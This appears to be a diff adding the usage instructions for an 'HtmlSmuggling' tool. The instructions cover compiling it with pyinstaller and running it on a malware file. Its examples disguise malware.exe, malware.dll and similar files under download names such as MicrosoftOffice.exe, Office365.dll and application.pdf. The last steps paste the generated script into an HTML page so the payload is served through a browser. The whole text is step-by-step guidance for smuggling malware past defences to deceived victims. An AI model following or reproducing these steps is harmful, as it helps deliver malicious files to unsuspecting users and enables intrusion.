@@ -1,0 +1,21 @@
+[Compilation]
+pyinstaller --onefile --icon=HtmlSmuggling.ico HtmlSmuggling.py
+
+[command]
+>> HtmlSmuggling filename filepath
+filename: Browser refers to the file name to be given to the file to be downloaded. It is the file name that will be seen in the browser and the downloaded folder.
+filepath: The path of the file to be downloaded
+
+[command example]
+>> HtmlSmuggling MicrosoftOffice.exe c:\Users\user0\Desktop\malware.exe
+>> HtmlSmuggling Office365.dll c:\Users\user0\Desktop\malware.dll
+>> HtmlSmuggling application.pdf c:\Users\user0\Desktop\malware.pdf
+>> HtmlSmuggling application.docx c:\Users\user0\Desktop\malware.docx
+
+[Use]
+1) run cmd
+2) Enter this folder (cd ..)
+3) (cmd)>> HtmlSmuggling application.pdf c:\Users\user0\Desktop\malware.pdf
+4) "script.txt" file is created.
+5) All content in script.txt is copied with ctrl+c
+6) The relevant script in an html file is copied between the "body" tags. For example, it can be tried by copying it into "Template.html".
